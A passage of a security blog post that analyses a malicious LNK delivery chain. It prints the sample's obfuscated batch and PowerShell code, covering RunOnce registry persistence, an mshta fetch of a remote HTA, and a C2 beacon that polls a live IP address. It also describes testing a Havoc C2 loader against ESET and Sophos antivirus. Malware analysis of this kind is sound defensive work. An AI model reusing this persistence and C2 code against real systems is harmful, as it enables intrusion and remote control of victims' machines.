</span><span class="nv">$runBat</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'executor.bat'</span><span class="p">;</span><span class="w">

</span><span class="n">sc</span><span class="w"> </span><span class="nv">$runBat</span><span class="w"> </span><span class="p">([</span><span class="n">byte</span><span class="p">[]](</span><span class="nv">$BatPayload</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-Skip</span><span class="w"> </span><span class="nx">74342</span><span class="p">))</span><span class="w"> </span><span class="nt">-Encoding</span><span class="w"> </span><span class="nx">Byte</span><span class="p">;</span><span class="w"> 

</span><span class="c">#Execute The BAT FILE.</span><span class="w">
</span><span class="c">#&amp; %windir%\SysWOW64\cmd.exe /c $runBat;</span><span class="w">


</span></code></pre></div></div> <p>At this point in the folder we will have these files:</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" media="(max-width: 480px)" srcset="/assets/img/lnk/3-480.webp"></source> <source class="responsive-img-srcset" media="(max-width: 800px)" srcset="/assets/img/lnk/3-800.webp"></source> <source class="responsive-img-srcset" media="(max-width: 1400px)" srcset="/assets/img/lnk/3-1400.webp"></source> <img src="/assets/img/lnk/3.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <div class="caption"> File Created by first script. </div> <p>The excel content appears to be this:</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" media="(max-width: 480px)" srcset="/assets/img/lnk/5-480.webp"></source> <source class="responsive-img-srcset" media="(max-width: 800px)" srcset="/assets/img/lnk/5-800.webp"></source> <source class="responsive-img-srcset" media="(max-width: 1400px)" srcset="/assets/img/lnk/5-1400.webp"></source> <img src="/assets/img/lnk/5.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" data-zoomable="" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <div class="caption"> Excel content </div> <h4 id="check-the-generated-files">Check the generated files</h4> <p>But what we are interested in now is the content of the bat file, which at first glance, obfuscated once again, is the following:</p> <div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">copy</span> <span class="vm">%~f0</span> <span class="s2">"</span><span class="nv">%appdata%</span><span class="s2">\Microsoft\Protect\UserProfileSafeBackup.bat"</span>
<span class="kd">REG</span> <span class="kd">ADD</span> <span class="kd">HKCU</span>\Software\Microsoft\Windows\CurrentVersion\RunOnce <span class="na">/v </span><span class="kd">BackupUserProfiles</span> <span class="na">/t </span><span class="kd">REG_SZ</span> <span class="na">/f /d </span><span class="s2">"C:\Windows\SysWOW64\cmd.exe /c </span><span class="nv">%appdata%</span><span class="s2">\Microsoft\Protect\UserProfileSafeBackup.bat"</span>

<span class="nb">start</span> <span class="na">/min </span><span class="kd">C</span>:\Windows\SysWOW64\cmd.exe <span class="na">/c </span><span class="kd">powershell</span> <span class="na">-windowstyle </span><span class="kd">hidden</span> <span class="na">-command </span><span class="s2">"$m6drsidu ="</span>$jWHmcU<span class="o">=</span><span class="s2">"""53746172742D536C656570202D5365636F6E64732036373B0D0A246E76536B6C55626151203D2031303234202A20313032343B0D0A247969786773465679203D2024656E763A434F4D50555445524E414D45202B20272D27202B2024656E763A555345524E414D452B272D5348273B0D0A24615777203D2027687474703A2F2F37352E3131392E3133362E3230372F636F6E6669672F62617365732F636F6E6669672E70687027202B20273F553D27202B202479697867734656793B0D0A24624C6D6F69667148774A786845203D2024656E763A54454D50202B20272F4B734B273B0D0A696620282128546573742D506174682024624C6D6F69667148774A7868452929207B0D0A204E65772D4974656D50726F7065727479202D506174682022484B43553A5C536F6674776172655C4D6963726F736F66745C57696E646F77735C43757272656E7456657273696F6E5C52756E4F6E636522202D4E616D65204F6C6D202D56616C75652027633A5C77696E646F77735C73797374656D33325C636D642E657865202F6320506F7765725368656C6C2E657865202D57696E646F775374796C652068696464656E202D4E6F4C6F676F202D4E6F6E496E746572616374697665202D6570206279706173732070696E67202D6E2031202D772033313137313420322E322E322E32207C7C206D7368746120687474703A2F2F6269616E303135312E6361666532342E636F6D2F61646D696E2F626F6172642F312E68746D6C27202D50726F70657274795479706520537472696E67202D466F7263653B0D0A7D0D0A0D0A66756E6374696F6E207576415828245A547864482C202443725A79667375615042597A290D0A7B0D0A20202020246E464B467258484B465651726F4B203D205B53797374656D2E546578742E456E636F64696E675D3A3A555446382E4765744279746573282443725A79667375615042597A293B0D0A202020205B53797374656D2E4E65742E48747470576562526571756573745D2024526E7A67717143203D205B53797374656D2E4E65742E576562526571756573745D3A3A43726561746528245A54786448293B0D0A2020202024526E7A677171432E4D6574686F64203D2027504F5354273B0D0A2020202024526E7A677171432E436F6E74656E7454797065203D20276170706C69636174696F6E2F782D7777772D666F726D2D75726C656E636F646564273B0D0A2020202024526E7A677171432E436F6E74656E744C656E677468203D20246E464B467258484B465651726F4B2E4C656E6774683B0D0A2020202024624C6D6F69667148774A78684555203D2024526E7A677171432E4765745265717565737453747265616D28293B0D0A2020202024624C6D6F69667148774A786845552E577269746528246E464B467258484B465651726F4B2C20302C20246E464B467258484B465651726F4B2E4C656E677468293B0D0A2020202024624C6D6F69667148774A786845552E466C75736828293B0D0A2020202024624C6D6F69667148774A786845552E436C6F736528293B0D0A202020205B53797374656D2E4E65742E48747470576562526573706F6E73655D20245845577742203D2024526E7A677171432E476574526573706F6E736528293B0D0A2020202024464F4F46467A6777564948203D204E65772D4F626A6563742053797374656D2E494F2E53747265616D526561646572282458455777422E476574526573706F6E736553747265616D2829293B0D0A2020202024624C6D6F69667148774A786845554C54203D2024464F4F46467A67775649482E52656164546F456E6428293B0D0A2020202072657475726E2024624C6D6F69667148774A786845554C543B0D0A7D0D0A646F0D0A7B0D0A202020205472797B0D0A2020202020202020246F7A69517575203D207576415820246157772027273B0D0A202020202020202049662028246F7A69517575202D6E6520276E756C6C27202D616E6420246F7A69517575202D6E65202727290D0A20202020202020207B0D0A202020202020202020202020246F7A695175753D246F7A695175752E537562537472696E6728312C20246F7A695175752E4C656E677468202D2032293B0D0A202020202020202020202020246250435A7562724A466F63203D205B53797374656D2E546578742E456E636F64696E675D3A3A555446382E476574537472696E67285B53797374656D2E436F6E766572745D3A3A46726F6D426173653634537472696E6728246F7A6951757529293B0D0A20202020202020202020202069662028246250435A7562724A466F63290D0A2020202020202020202020207B0D0A2020202020202020202020202020202069662028246250435A7562724A466F632E436F6E7461696E732827726567656469743A2729290D0A202020202020202020202020202020207B0D0A2020202020202020202020202020202020202020246D6274447643656E74784B3D246250435A7562724A466F632E537562537472696E672838293B0D0A202020202020202020202020202020202020202024436861724172726179203D246D6274447643656E74784B2E53706C697428277C7C27293B0D0A202020202020202020202020202020202020202069662028244368617241727261792E4C656E677468202D65712035290D0A20202020202020202020202020202020202020207B0D0A2020202020202020202020202020202020202020202020204E65772D4974656D50726F7065727479202D5061746820244368617241727261795B305D202D4E616D6520244368617241727261795B325D202D56616C756520244368617241727261795B345D202D50726F70657274795479706520537472696E67202D466F7263653B0D0A202020202020202020202020202020202020202020202020244372724B684E464F4E46474B203D2027523D27202B205B53797374656D2E436F6E766572745D3A3A546F426173653634537472696E67285B53797374656D2E546578742E456E636F64696E675D3A3A555446382E47657442797465732827454F462729293B0D0A20202020202020202020202020202020202020202020202075764158202461577720244372724B684E464F4E46474B3B0D0A20202020202020202020202020202020202020207D0D0A202020202020202020202020202020207D0D0A202020202020202020202020202020202020202020202020207D0D0A20202020202020207D0D0A202020207D2043617463687B7D0D0A7D7768696C65282474727565202D6571202474727565290D0A2020202053746172742D536C656570202D5365636F6E647320353B"""</span><span class="o">;</span>$nj4KKFFRe<span class="o">=</span><span class="s2">""""""</span><span class="o">;</span><span class="k">for</span><span class="o">(</span>$xlEKy9tdBWJ<span class="o">=</span><span class="m">0</span><span class="o">;</span>$xlEKy9tdBWJ <span class="na">-le </span>$jWHmcU.Length<span class="o">-</span><span class="m">2</span><span class="o">;</span>$xlEKy9tdBWJ<span class="o">=</span>$xlEKy9tdBWJ<span class="o">+</span><span class="m">2</span><span class="o">){</span>$dYaD<span class="o">=</span>$jWHmcU<span class="o">[</span>$xlEKy9tdBWJ<span class="o">]+</span>$jWHmcU<span class="o">[</span>$xlEKy9tdBWJ<span class="o">+</span><span class="m">1</span><span class="o">];</span>$nj4KKFFRe<span class="o">=</span> $nj4KKFFRe<span class="o">+[</span><span class="kd">char</span><span class="o">]([</span><span class="nb">convert</span><span class="o">]</span>::toint16<span class="o">(</span>$dYaD<span class="o">,</span><span class="m">16</span><span class="o">));};</span><span class="kd">Invoke</span><span class="na">-Command -ScriptBlock </span><span class="o">([</span><span class="kd">Scriptblock</span><span class="o">]</span>::Create<span class="o">(</span>$nj4KKFFRe<span class="o">));</span><span class="s2">";Invoke-Command -ScriptBlock ([Scriptblock]::Create($m6drsidu));"</span>

</code></pre></div></div> <p>The first 3 lines of the code make sure to create persistence in the system, let’s see how</p> <div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">Note</span>: <span class="vm">%~f0</span> <span class="kd">take</span> <span class="kd">the</span> <span class="kd">name</span> <span class="kd">and</span> <span class="nb">path</span> <span class="kd">of</span> <span class="kd">the</span> <span class="kd">current</span> .bat <span class="kd">file</span><span class="o">,</span> <span class="kd">so</span> <span class="k">in</span> <span class="kd">this</span> <span class="kd">case</span><span class="o">,</span> <span class="kd">C</span>:\Path\location\executor.bat

#Step1 <span class="o">-</span> <span class="kd">Copy</span> <span class="kd">the</span> <span class="kd">bat</span> <span class="kd">file</span> <span class="k">in</span> <span class="s2">"</span><span class="nv">%appdata%</span><span class="s2">\Microsoft\Protect\"</span> <span class="kd">with</span> <span class="kd">the</span> <span class="kd">name</span> <span class="kd">of</span> <span class="kd">UserProfileSafeBackup</span>.bat
<span class="nb">copy</span> <span class="vm">%~f0</span> <span class="s2">"</span><span class="nv">%appdata%</span><span class="s2">\Microsoft\Protect\UserProfileSafeBackup.bat"</span>

#Step2 <span class="o">-</span> <span class="kd">Create</span> <span class="kd">persistence</span> <span class="k">in</span> <span class="kd">the</span> <span class="kd">RunOnce</span> <span class="kd">key</span>.
<span class="kd">REG</span> <span class="kd">ADD</span> <span class="kd">HKCU</span>\Software\Microsoft\Windows\CurrentVersion\RunOnce <span class="na">/v </span><span class="kd">BackupUserProfiles</span> <span class="na">/t </span><span class="kd">REG_SZ</span> <span class="na">/f /d </span><span class="s2">"C:\Windows\SysWOW64\cmd.exe /c </span><span class="nv">%appdata%</span><span class="s2">\Microsoft\Protect\UserProfileSafeBackup.bat"</span>

</code></pre></div></div> <p>The other part of the script is more interesting, it creates a variable with functions inside, and creates a script block</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="n">Scriptblock</span><span class="p">]::</span><span class="n">Create</span><span class="w">
</span></code></pre></div></div> <p>By deobfuscating the internal variable “nj4KKFFRe” we will have this code:</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Start-Sleep</span><span class="w"> </span><span class="nt">-Seconds</span><span class="w"> </span><span class="nx">67</span><span class="p">;</span><span class="w">

</span><span class="nv">$nvSklUbaQ</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1024</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">1024</span><span class="p">;</span><span class="w">

</span><span class="nv">$hostname</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">COMPUTERNAME</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'-'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">USERNAME</span><span class="o">+</span><span class="s1">'-SH'</span><span class="p">;</span><span class="w">
</span><span class="nv">$baseUrl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'http://75.119.136.207/config/bases/config.php'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'?U='</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nv">$hostname</span><span class="p">;</span><span class="w">

</span><span class="nv">$tmpPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">TEMP</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'/KsK'</span><span class="p">;</span><span class="w">  </span><span class="c">#C:\Users\user\AppData\Local\Temp\KsK</span><span class="w">

</span><span class="c">#If path not exist Set another regex, and Exec another HTA payload</span><span class="w">
</span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">Test-Path</span><span class="w"> </span><span class="nv">$tmpPath</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
 </span><span class="n">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="s2">"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">Olm</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="s1">'c:\\windows\\system32\\cmd.exe /c PowerShell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass ping -n 1 -w 311714 2.2.2.2 || mshta http://bian0151.cafe24.com/admin
/board/1.html'</span><span class="w"> </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="nx">String</span><span class="w"> </span><span class="nt">-Force</span><span class="p">;</span><span class="w">
</span><span class="p">}</span><span class="w">


</span><span class="c">#Post Request(URL,DATA) return response</span><span class="w">
</span><span class="kr">function</span><span class="w"> </span><span class="nf">DoPostRequest</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span><span class="w"> </span><span class="bp">$input</span><span class="p">)</span><span class="w">
</span><span class="p">{</span><span class="w">
    </span><span class="nv">$post_data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">UTF8.GetBytes</span><span class="p">(</span><span class="bp">$input</span><span class="p">);</span><span class="w">
    </span><span class="p">[</span><span class="n">System.Net.HttpWebRequest</span><span class="p">]</span><span class="w"> </span><span class="nv">$HttpRequest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Net.WebRequest</span><span class="p">]::</span><span class="n">Create</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span><span class="w">
    </span><span class="nv">$HttpRequest</span><span class="o">.</span><span class="nf">Method</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'POST'</span><span class="p">;</span><span class="w">
    </span><span class="nv">$HttpRequest</span><span class="o">.</span><span class="nf">ContentType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'application/x-www-form-urlencoded'</span><span class="p">;</span><span class="w">
    </span><span class="nv">$HttpRequest</span><span class="o">.</span><span class="nf">ContentLength</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$post_data</span><span class="o">.</span><span class="nf">Length</span><span class="p">;</span><span class="w">
    
    </span><span class="nv">$Stream</span><span class="w">  </span><span class="o">=</span><span class="w"> </span><span class="nv">$HttpRequest</span><span class="o">.</span><span class="nf">GetRequestStream</span><span class="p">();</span><span class="w">
    </span><span class="nv">$Stream</span><span class="o">.</span><span class="nf">Write</span><span class="p">(</span><span class="nv">$post_data</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$post_data</span><span class="o">.</span><span class="nf">Length</span><span class="p">);</span><span class="w">
    </span><span class="nv">$Stream</span><span class="o">.</span><span class="nf">Flush</span><span class="p">();</span><span class="w">
    </span><span class="nv">$Stream</span><span class="o">.</span><span class="nf">Close</span><span class="p">();</span><span class="w">
    </span><span class="p">[</span><span class="n">System.Net.HttpWebResponse</span><span class="p">]</span><span class="w"> </span><span class="nv">$Response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$HttpRequest</span><span class="o">.</span><span class="nf">GetResponse</span><span class="p">();</span><span class="w">
    
    </span><span class="nv">$RespoonseReader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.IO.StreamReader</span><span class="p">(</span><span class="nv">$Response</span><span class="o">.</span><span class="nf">GetResponseStream</span><span class="p">());</span><span class="w">

    </span><span class="nv">$Resutl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$ResponseReader</span><span class="o">.</span><span class="nf">ReadToEnd</span><span class="p">();</span><span class="w">
    </span><span class="kr">return</span><span class="w"> </span><span class="nv">$Result</span><span class="p">;</span><span class="w">
</span><span class="p">}</span><span class="w">


</span><span class="c">#Main, do Each 5 second</span><span class="w">
</span><span class="kr">do</span><span class="w">
</span><span class="p">{</span><span class="w">
    </span><span class="kr">Try</span><span class="p">{</span><span class="w">
    </span><span class="c">#Do the request</span><span class="w">
        </span><span class="nv">$ResultRequest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DoPostRequest</span><span class="w"> </span><span class="nv">$baseUrl</span><span class="w"> </span><span class="s1">''</span><span class="p">;</span><span class="w">
        </span><span class="c">#If request IS NOT null</span><span class="w">
        </span><span class="kr">If</span><span class="w"> </span><span class="p">(</span><span class="nv">$ResultRequest</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="s1">'null'</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="nv">$ResultRequest</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="s1">''</span><span class="p">)</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="c">#Parse someresult</span><span class="w">
            </span><span class="nv">$ResultRequest</span><span class="o">=</span><span class="nv">$ResultRequest</span><span class="o">.</span><span class="nf">SubString</span><span class="p">(</span><span class="nx">1</span><span class="p">,</span><span class="w"> </span><span class="nv">$ResultRequest</span><span class="o">.</span><span class="nf">Length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">2</span><span class="p">);</span><span class="w">

            </span><span class="nv">$DecodedRes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">UTF8.GetString</span><span class="p">([</span><span class="n">System.Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$ResultRequest</span><span class="p">));</span><span class="w">

            </span><span class="c">#If decoded Res contains regedit</span><span class="w">
            </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$DecodedRes</span><span class="p">)</span><span class="w">
            </span><span class="p">{</span><span class="w">
                </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$DecodedRes</span><span class="o">.</span><span class="nf">Contains</span><span class="p">(</span><span class="s1">'regedit:'</span><span class="p">))</span><span class="w">
                </span><span class="p">{</span><span class="w">
                    </span><span class="c">#Get Substring of 8 and split in char array</span><span class="w">
                    </span><span class="nv">$tmpString</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$DecodedRes</span><span class="o">.</span><span class="nf">SubString</span><span class="p">(</span><span class="nx">8</span><span class="p">);</span><span class="w">
                    </span><span class="nv">$CharArray</span><span class="w"> </span><span class="o">=</span><span class="nv">$tmpString</span><span class="o">.</span><span class="nf">Split</span><span class="p">(</span><span class="s1">'||'</span><span class="p">);</span><span class="w">

                    </span><span class="c">#If the char array is 5</span><span class="w">
                    </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$CharArray</span><span class="o">.</span><span class="nf">Length</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="mi">5</span><span class="p">)</span><span class="w">
                    </span><span class="p">{</span><span class="w">
                        </span><span class="c">#Create a new property, maybe a registry key</span><span class="w">
                        </span><span class="n">New-ItemProperty</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nv">$CharArray</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nv">$CharArray</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w"> </span><span class="nt">-Value</span><span class="w"> </span><span class="nv">$CharArray</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="w"> </span><span class="nt">-PropertyType</span><span class="w"> </span><span class="nx">String</span><span class="w"> </span><span class="nt">-Force</span><span class="p">;</span><span class="w">
                        </span><span class="nv">$newdata</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'R='</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">[</span><span class="n">System.Convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">([</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">UTF8.GetBytes</span><span class="p">(</span><span class="s1">'EOF'</span><span class="p">));</span><span class="w"> </span><span class="c"># R=RU9G</span><span class="w">
                        </span><span class="n">DoPostRequest</span><span class="w"> </span><span class="nv">$baseUrl</span><span class="w"> </span><span class="nv">$newdata</span><span class="p">;</span><span class="w"> </span><span class="c">#Do another Post and continue the Loop</span><span class="w">
                    </span><span class="p">}</span><span class="w">
                </span><span class="p">}</span><span class="w">
                         </span><span class="p">}</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w"> </span><span class="kr">Catch</span><span class="p">{}</span><span class="w">
</span><span class="p">}</span><span class="kr">while</span><span class="p">(</span><span class="bp">$true</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="bp">$true</span><span class="p">)</span><span class="w">
    </span><span class="n">Start-Sleep</span><span class="w"> </span><span class="nt">-Seconds</span><span class="w"> </span><span class="nx">5</span><span class="p">;</span><span class="w">

</span></code></pre></div></div> <p>Essentially, this code, as soon as it is launched, checks that the %tmp%/KsK path is present, if not, it adds more persistence on the RunOnce key, downloading another hta from the site</p> <p><a href="#">http://bian0151.cafe24.com/admin/board/1.html</a></p> <p>Since the URL is offline, we cannot know what that file contained, but this is a very practical example of how payload delivery chains are made.</p> <p>Then the program sends a POST request to the URL every 5 seconds <a>http://75.119.136.207/config/bases/config.php?U=myhostname</a></p> <p>if the response is not empty, it is decoded in base 64 and if the string “regedit:” is present in the response string, the string is divided and split into a final char array, and if the array is equal to 5, a system key is added, each parameter is a field of the array Subsequently, a post request is sent to the usual url, with the post data R=RU9G.</p> <p>This whole thing is done to create persistence and add system keys, probably the C2 agent was released from that HTA file. This example perfectly represents how a delivery chain can be intrinsic.</p> <h2 id="evasion">Evasion</h2> <p>Now it’s time to test something, we will test some of our payloads against Eset, Kaspersky, and Sophos. (For the moment this is what I have).</p> <h3 id="lets-prepare-the-soup">Let’s prepare the soup</h3> <p>For this test we will use a loader that will load the Havoc C2 framework. (At the time of testing, the loader was FUD). I will try 2 payload, an msi, and the 4share.com one. Finally, I will send the payload in a zip by email, having it downloaded from google drive.</p> <p>We will target ESET Premium and Sophos EDR.</p> <h3 id="testing-time">Testing time</h3> <p>As a first attempt, I create my own msi file, i will call setup.msi. Then as the first LNK i will try the basic msi remote installer, the result follow:</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <video src="/assets/video/lnk/poc-eset.mp4" class="img-fluid rounded z-depth-1" width="auto" height="auto" controls=""></video> </figure> </div> </div> <div class="caption"> Eset MSI test Eset Premium </div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <video src="/assets/video/lnk/poc-sophos-2.mp4" class="img-fluid rounded z-depth-1" width="auto" height="auto" controls=""></video> </figure> </div> </div> <div class="caption"> Sophos MSI Sophos EDR </div> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <video src="/assets/video/lnk/poc-sophos-1.mp4" class="img-fluid rounded z-depth-1" width="auto" height="auto" controls=""></video> </figure> </div> </div> <div class="caption"> Sophos 4shared.com payload Sophos EDR </div> <p>In the first payload I request UAC in the second I don’t. Note that these payloads were not very elaborate, it was all done in a short time for the purpose of testing the AVs.</p> <h1 id="conclusion">Conclusion</h1> <p>In this little post we have analyzed some of the most common payloads for LNK extensions, and analyzed a known file used by some attackers. We did some small tests against two antiviruses, simulating sending an email and executing a file. As we have seen, there are many ways in which we can create our chain before installing the malware.</p> <p>See you in the next post.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" media="(max-width: 480px)" srcset="/assets/img/lnk/cover-480.webp"></source> <source class="responsive-img-srcset" media="(max-width: 800px)" srcset="/assets/img/lnk/cover-800.webp"></source> <source class="responsive-img-srcset" media="(max-width: 1400px)" srcset="/assets/img/lnk/cover-1400.webp"></source> <img src="/assets/img/lnk/cover.png" class="img-fluid rounded z-depth-1" width="auto" height="auto" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> </div> </article> </div> </div> <footer class="sticky-bottom mt-5"> <div class="container"> © Copyright 2023 #~&gt; 0xNathe. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js" integrity="sha256-fgLAgv7fyCGopR/gBNq2iW3ZKIdqIcyshnUULC4vex8=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.8/dist/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js"></script> <script defer src="https://unpkg.com/bootstrap-table@1.21.4/dist/bootstrap-table.min.js"></script> <script src="/assets/js/no_defer.js"></script> <script defer src="/assets/js/common.js"></script> <script defer src="/assets/js/copy_code.js" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>